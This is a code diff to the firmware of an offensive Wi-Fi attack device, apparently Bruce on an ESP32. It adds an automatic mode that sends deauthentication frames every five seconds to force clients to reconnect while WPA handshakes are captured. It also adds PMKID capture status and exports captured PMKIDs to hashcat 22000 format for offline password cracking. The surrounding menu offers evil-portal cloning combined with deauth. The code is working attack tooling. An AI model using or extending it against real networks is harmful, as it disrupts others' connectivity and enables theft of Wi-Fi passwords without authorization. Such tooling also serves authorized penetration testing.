@@ -528,6 +528,9 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
     int prevNumEAPOL = initialNumEAPOL;
     bool hasBeacons = false;
     bool hasEAPOL = false;
+    bool autoDeauth = false;          // Auto-deauth mode toggle
+    uint32_t lastAutoDeauth = 0;      // Last auto-deauth timestamp
+    const uint32_t AUTO_DEAUTH_INTERVAL = 5000; // 5 seconds between auto-deauths
 
     tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
     tft.setTextSize(FM);
@@ -566,8 +569,15 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
             // Show console status
             if (hasBeacons && handshakeUsable(hsTracker)) {
                 tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
-                padprintln("Status: CAPTURED!");
+                if (hsTracker.pmkid) {
+                    padprintln("Status: PMKID CAPTURED!");
+                } else {
+                    padprintln("Status: CAPTURED!");
+                }
                 padprintln("");
+                // Show PMKID status
+                tft.setTextColor(hsTracker.pmkid ? TFT_GREEN : TFT_DARKGREY, bruceConfig.bgColor);
+                padprintln("        PMKID:       " + String(hsTracker.pmkid ? "Found!" : "N/A"));
                 tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                 padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                 tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
@@ -581,6 +591,9 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
                 tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
                 padprintln("Status: Beacon captured");
                 padprintln("");
+                // Show PMKID status
+                tft.setTextColor(hsTracker.pmkid ? TFT_GREEN : TFT_DARKGREY, bruceConfig.bgColor);
+                padprintln("        PMKID:       " + String(hsTracker.pmkid ? "Found!" : "Waiting..."));
                 tft.setTextColor(hsTracker.msg1 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
                 padprintln("        EAPOL MSG 1: " + String(hsTracker.msg1 ? "Captured" : "None"));
                 tft.setTextColor(hsTracker.msg2 ? TFT_GREEN : TFT_RED, bruceConfig.bgColor);
@@ -598,9 +611,18 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
 
             padprintln("");
             padprintln("Deauth sent: " + String(deauthCount));
+            // Show auto-deauth status
+            if (autoDeauth) {
+                tft.setTextColor(TFT_ORANGE, bruceConfig.bgColor);
+                padprintln("Auto-Deauth: ON (every 5s)");
+            } else {
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+                padprintln("Auto-Deauth: OFF");
+            }
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
             padprintln("");
             tft.drawRightString(
-                "Press " + String(BTN_ALIAS) + " to send deauth", tftWidth - 10, tftHeight - 35, 1
+                String(BTN_ALIAS) + ": deauth | Next: auto", tftWidth - 10, tftHeight - 35, 1
             );
             tft.drawString("Press Back to exit", 10, tftHeight - 20);
 
@@ -608,7 +630,31 @@ void capture_handshake(String tssid, String mac, uint8_t channel) {
             needRedraw = false;
         }
 
-        // If user presses the select button -> send deauth and request redraw
+        // Toggle auto-deauth with Next button
+        if (check(NextPress)) {
+            autoDeauth = !autoDeauth;
+            if (autoDeauth) {
+                lastAutoDeauth = millis(); // Reset timer on enable
+            }
+            needRedraw = true;
+        }
+
+        // Auto-deauth logic (runs in parallel with capture)
+        if (autoDeauth && !handshakeUsable(hsTracker)) {
+            uint32_t now = millis();
+            if (now - lastAutoDeauth >= AUTO_DEAUTH_INTERVAL) {
+                wsl_bypasser_send_raw_frame(&ap_record, channel);
+                for (int i = 0; i < 5; i++) {
+                    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                    vTaskDelay(10 / portTICK_PERIOD_MS);
+                }
+                deauthCount += 5;
+                lastAutoDeauth = now;
+                needRedraw = true;
+            }
+        }
+
+        // If user presses the select button -> send deauth manually
         if (check(SelPress)) {
             wsl_bypasser_send_raw_frame(&ap_record, channel);
             for (int i = 0; i < 5; i++) {
@@ -642,6 +688,42 @@ AGAIN:
         {"Information",         [=]() { wifi_atk_info(tssid, mac, channel); }      },
         {"Deauth",              [=]() { target_atk(tssid, mac, channel); }         },
         {"Capture Handshake",   [=]() { capture_handshake(tssid, mac, channel); }  },
+        {"Export Hashcat",      [=]() {
+            // Export PMKID to hashcat 22000 format
+            if (!hsTracker.pmkid) {
+                displayError("No PMKID captured", true);
+                return;
+            }
+            FS *fs;
+            if (setupSdCard()) {
+                fs = &SD;
+                if (!SD.exists("/BrucePCAP/hashcat")) {
+                    SD.mkdir("/BrucePCAP/hashcat");
+                }
+            } else {
+                fs = &LittleFS;
+                if (!LittleFS.exists("/BrucePCAP/hashcat")) {
+                    LittleFS.mkdir("/BrucePCAP/hashcat");
+                }
+            }
+            String sanitizedSsid = "";
+            for (size_t i = 0; i < tssid.length() && i < 16; ++i) {
+                char c = tssid[i];
+                if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+                    (c >= '0' && c <= '9') || c == '-' || c == '_') {
+                    sanitizedSsid += c;
+                } else {
+                    sanitizedSsid += '_';
+                }
+            }
+            if (sanitizedSsid.length() == 0) sanitizedSsid = "network";
+            String outPath = "/BrucePCAP/hashcat/" + sanitizedSsid + ".hc22000";
+            if (exportToHashcat22000(fs, nullptr, outPath.c_str())) {
+                displaySuccess("Exported to:\n" + outPath);
+            } else {
+                displayError("Export failed", true);
+            }
+        }},
         {"Clone Portal",        [=]() { EvilPortal(tssid, channel, false, false); }},
         {"Deauth+Clone",        [=]() { EvilPortal(tssid, channel, true, false); } },
         {"Deauth+Clone+Verify",
